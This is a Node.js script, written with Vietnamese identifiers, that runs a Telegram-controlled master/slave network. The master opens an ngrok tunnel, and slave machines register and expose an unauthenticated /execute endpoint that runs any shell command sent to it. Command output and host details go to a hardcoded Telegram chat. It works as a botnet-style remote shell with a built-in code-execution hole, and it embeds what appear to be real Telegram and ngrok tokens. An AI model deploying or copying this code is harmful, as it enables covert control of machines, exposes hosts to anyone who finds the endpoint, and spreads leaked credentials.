const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');
const ngrok = require('ngrok');
const fetch = require('node-fetch');

// ==================== CẤU HÌNH ====================
const CẤU_HÌNH = {
  TOKEN: '7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts',
  CHAT_ID: '7371969470',
  CỔNG_HTTP: Math.floor(Math.random() * 2000) + 8000,
  NGROK_AUTH: '2vYg8D0LBx82zPbpAwl0ZMGSyma_2MKuxq8wxjoxVagErnREc',
  THỜI_GIAN_PING: 15000 // 15 giây
};

// ==================== KHỞI TẠO ====================
const bot = new TelegramBot(CẤU_HÌNH.TOKEN, { polling: false });
const làMaster = process.env.MASTER === 'true';
const URL_MASTER = process.env.MASTER_URL;
const TÊN_MÁY = os.hostname();
let danhSáchSlave = [];
let httpTunnel;
const app = express();
app.use(express.json());

// ==================== TIỆN ÍCH ====================
const lấyGiờViệtNam = () => new Date().toLocaleString('vi-VN', {
  timeZone: 'Asia/Ho_Chi_Minh',
  hour12: false,
  year: 'numeric',
  month: '2-digit',
  day: '2-digit',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit'
});

const chạyNeofetch = () => new Promise(resolve => {
  exec('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (command -v neofetch >/dev/null && neofetch --stdout) || echo "Không chạy được neofetch"',
    { timeout: 5000 },
    (error, stdout, stderr) => resolve(stdout || stderr || error?.message || 'Không lấy được thông tin hệ thống')
  );
});

const lấySlaveOnline = () => danhSáchSlave.filter(s => Date.now() - s.lastPing < CẤU_HÌNH.THỜI_GIAN_PING);

// ==================== XỬ LÝ SLAVE ====================
const xửLýSlave = async (tênMáy, cổng) => {
  const đãCó = danhSáchSlave.findIndex(s => s.tênMáy === tênMáy);
  const slave = { tênMáy, cổng: cổng || 'N/A', lastPing: Date.now() };

  if (đãCó >= 0) {
    danhSáchSlave[đãCó] = slave;
  } else {
    danhSáchSlave.push(slave);
    await bot.sendMessage(CẤU_HÌNH.CHAT_ID, `🕒 [${lấyGiờViệtNam()}] Slave kết nối:\n🏷️ ${tênMáy}\n🔌 Cổng: ${cổng || 'N/A'}`);
    
    if (!làMaster) {
      const thôngTin = await chạyNeofetch();
      await bot.sendMessage(CẤU_HÌNH.CHAT_ID, `🖥️ Thông tin slave ${tênMáy}:\n\`\`\`\n${thôngTin}\n\`\`\``, { parse_mode: 'Markdown' });
    }
  }
};

// ==================== XỬ LÝ LỆNH ====================
const xửLýLệnhTrênSlave = async (slave, lệnh) => {
  try {
    const response = await fetch(`http://${slave.tênMáy}:${slave.cổng}/execute`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: lệnh }),
      timeout: 10000
    });
    return await response.json();
  } catch (e) {
    return { error: e.message };
  }
};

// ==================== API ====================
app.post(`/bot${CẤU_HÌNH.TOKEN}`, async (req, res) => {
  const { text, chat } = req.body.message || {};
  if (!text?.startsWith('/')) return res.sendStatus(200);

  const lệnh = text.slice(1).split(' ');
  const [cmd, ...args] = lệnh;

  try {
    switch (cmd) {
      case 'help':
        await bot.sendMessage(chat.id, '🛠️ Danh sách lệnh:\n/status - Trạng thái hệ thống\n/cmd [lệnh] - Thực thi lệnh\n/neofetch - Thông tin hệ thống\n/help - Trợ giúp');
        break;

      case 'status':
        const online = lấySlaveOnline();
        let msg = `🕒 [${lấyGiờViệtNam()}]\n🟢 Master: ${TÊN_MÁY}\n📡 Online: ${online.length}/${danhSáchSlave.length}\n`;
        online.forEach(s => msg += `🤖 ${s.tênMáy} (cổng:${s.cổng}, ping:${Math.floor((Date.now() - s.lastPing)/1000}s)\n`);
        await bot.sendMessage(chat.id, msg);
        break;

      case 'neofetch':
        const info = await chạyNeofetch();
        await bot.sendMessage(chat.id, `🕒 [${lấyGiờViệtNam()}]\n🖥️ ${TÊN_MÁY}:\n\`\`\`\n${info}\n\`\`\``, { parse_mode: 'Markdown' });
        break;

      case 'cmd':
        if (!làMaster) return await bot.sendMessage(chat.id, '⚠️ Lệnh chỉ dành cho master');
        const command = args.join(' ');
        if (!command) return await bot.sendMessage(chat.id, '⚠️ Thiếu lệnh');
        
        const slaves = lấySlaveOnline();
        if (!slaves.length) return await bot.sendMessage(chat.id, '⚠️ Không có slave nào online');
        
        await bot.sendMessage(chat.id, `⚙️ Đang thực thi "${command}" trên ${slaves.length} slave...`);
        
        for (const slave of slaves) {
          const { result, error } = await xửLýLệnhTrênSlave(slave, command);
          await bot.sendMessage(chat.id, `💻 ${slave.tênMáy}:\n\`\`\`\n${error || result}\n\`\`\``, { parse_mode: 'Markdown' });
        }
        break;

      default:
        await bot.sendMessage(chat.id, '⚠️ Lệnh không hợp lệ');
    }
  } catch (e) {
    console.error('Lỗi xử lý lệnh:', e);
    await bot.sendMessage(chat.id, '⚠️ Có lỗi xảy ra khi xử lý lệnh');
  } finally {
    res.sendStatus(200);
  }
});

app.post('/register', async (req, res) => {
  const { hostname, port } = req.body;
  if (hostname) await xửLýSlave(hostname, port);
  res.sendStatus(200);
});

app.post('/execute', async (req, res) => {
  if (làMaster) return res.sendStatus(403);
  const { command } = req.body;
  exec(command, { timeout: 10000 }, (e, out, err) => {
    res.json({ result: (out || err || e?.message || 'Không có kết quả').trim() });
  });
});

// ==================== GIÁM SÁT ====================
setInterval(() => {
  const now = Date.now();
  danhSáchSlave.filter(s => now - s.lastPing > CẤU_HÌNH.THỜI_GIAN_PING)
    .forEach(s => bot.sendMessage(CẤU_HÌNH.CHAT_ID, `🕒 [${lấyGiờViệtNam()}] Slave ngắt kết nối: ${s.tênMáy}`));
  danhSáchSlave = danhSáchSlave.filter(s => now - s.lastPing < CẤU_HÌNH.THỜI_GIAN_PING);
}, 3000);

// ==================== KHỞI ĐỘNG ====================
app.listen(CẤU_HÌNH.CỔNG_HTTP, async () => {
  console.log(`🚀 Server chạy trên cổng ${CẤU_HÌNH.CỔNG_HTTP}`);

  if (làMaster) {
    try {
      httpTunnel = await ngrok.connect({
        addr: CẤU_HÌNH.CỔNG_HTTP,
        authtoken: CẤU_HÌNH.NGROK_AUTH,
        region: 'ap'
      });
      console.log(`🌐 Ngrok tunnel: ${httpTunnel}`);

      await bot.setWebHook(`${httpTunnel}/bot${CẤU_HÌNH.TOKEN}`);
      const info = await chạyNeofetch();
      
      await bot.sendMessage(
        CẤU_HÌNH.CHAT_ID,
        `🕒 [${lấyGiờViệtNam()}]\n🎯 Master ${TÊN_MÁY} đã sẵn sàng!\n` +
        `🔗 URL: ${httpTunnel}\n🔌 Cổng: ${CẤU_HÌNH.CỔNG_HTTP}\n\n` +
        `Lệnh chạy Slave:\n\`\`\`\nMASTER_URL="${httpTunnel}" node bot.js\n\`\`\`\n` +
        `\`\`\`\n${info}\n\`\`\``,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.error('Khởi động master thất bại:', e);
      process.exit(1);
    }
  } else if (URL_MASTER) {
    setInterval(async () => {
      try {
        await fetch(`${URL_MASTER}/register`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            hostname: TÊN_MÁY, 
            port: CẤU_HÌNH.CỔNG_HTTP 
          })
        });
      } catch (e) {
        console.error('Không thể kết nối tới master:', e.message);
      }
    }, 3000);
  }
});
